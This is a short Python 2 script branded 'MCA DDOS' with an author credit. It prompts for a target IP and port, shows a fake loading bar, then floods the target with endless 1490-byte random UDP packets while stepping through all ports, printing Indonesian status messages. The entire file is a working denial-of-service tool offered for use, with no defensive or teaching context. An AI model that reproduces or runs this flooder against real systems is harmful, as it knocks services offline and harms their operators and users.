import sys
import os
import time
import socket
import random
#Code
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet MCA DDOS| lolcat")

print
print "\033[1;33mAuthor   :  Mr.|CDA01"
print "github   : https://github.com/"
print "Wa : 081953504898"
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Sabar| lolcat")

print "[                    ] 0% "
time.sleep(2)
print "[=====               ] 25%"
time.sleep(2)
print "[==========          ] 50%"
time.sleep(1)
print "[===============     ] 75%"
time.sleep(1)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "\033[92mMengirim %s paket ke %s Port Yang terkirim: %s"%(sent,ip,port)
     if port == 65534:
       port = 1
       
       print "Good Bye"